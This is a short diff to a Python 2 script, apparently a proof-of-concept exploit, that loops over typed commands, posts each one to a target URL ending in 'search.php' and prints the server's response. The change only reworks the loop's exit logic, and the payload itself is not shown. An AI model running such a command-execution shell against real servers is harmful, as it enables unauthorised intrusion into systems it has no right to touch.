@@ -8,8 +8,7 @@ def poc():
 			print("[*] Please make sure the url end with 'search.php'")
 			exit()
 
-		flag = 1
-		while flag:
+		while 1:
 			try:
 				command = raw_input("[*] input the command:")
 				if command != "exit":
@@ -28,7 +27,7 @@ def poc():
 					r = requests.post(url,data=postdata)
 					print r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding)
 				else:
-					flag = 0
+					break
 			except EOFError as e:
 				print "[*] type 'exit' to quit"
 				pass
